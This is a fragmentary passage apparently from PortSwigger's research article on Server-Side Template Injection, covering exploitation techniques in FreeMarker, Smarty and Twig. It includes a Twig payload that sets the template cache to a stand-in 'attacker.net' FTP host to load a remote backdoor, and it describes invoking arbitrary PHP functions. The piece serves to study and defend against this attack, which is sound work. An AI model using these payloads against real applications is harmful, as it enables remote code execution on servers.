...
published: 2015-08-05T19:00:00
description: "Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently c"
---
...
Server-Side Template Injection: RCE For The Modern Web App - YouTube

Tap to unmute

[Server-Side Template Injection: RCE For The Modern Web App](https://www.youtube.com/watch?v=3cT0uE7Y87s) [Black Hat](https://www.youtube.com/channel/UCJ6q9Ie29ajGqKApbLqfBOg)
...
### [Identify](https://portswigger.net/research/server-side-template-injection\#Identify)
...
>
> \- http://freemarker.org/docs/ref\_builtins\_expert.html#ref\_builtin\_new
...
Furthermore, we can call arbitrary static methods. Smarty exposes a range of invaluable static classes, including [Smarty\_Internal\_Write\_File](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16), which has the following method:
...
The \_self object doesn't contain any useful methods, but does have an env attribute that refers to a [Twig\_Environment](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php) object, which looks more promising. The [setCache](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L233) method on Twig\_Environment can be used to change the location Twig tries to load and execute compiled templates (PHP files) from. An obvious attack is therefore to introduce a Remote File Include vulnerability by setting the cache location to a remote server:

`{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}`

However, modern versions of PHP disable inclusion of remote files by default via [allow\_url\_include](http://php.net/manual/en/filesystem.configuration.php), so this approach isn't much use.

Further code review reveals a call to the dangerous [call\_user\_func](http://php.net/manual/en/function.call-user-func.php) function on line 874, in the [getFilter](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874) method. Provided we control the arguments to this, it can be used to invoke arbitrary PHP functions.
...
Thanks to this snippet we can call any method on objects that implement Twig\_TemplateInterface, which happens to include \_self. The \_self object's [displayBlock](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Template.php#L139) method offers a high-level gadget of sorts:
...
This can't be used to exploit the Twig\_Environment->getFilter() method used earlier as there is no way to obtain a reference to the Environment object. However, it does mean that we can invoke methods on any objects the developer has passed into the template - the \_context object's attributes can be iterated over to see if anything useful is in scope. The XWiki example later illustrates exploiting a developer-provided class.
...
[LAB\\
\\
Server-Side Template Injection Labs](https://portswigger.net/web-security/server-side-template-injection/exploiting)
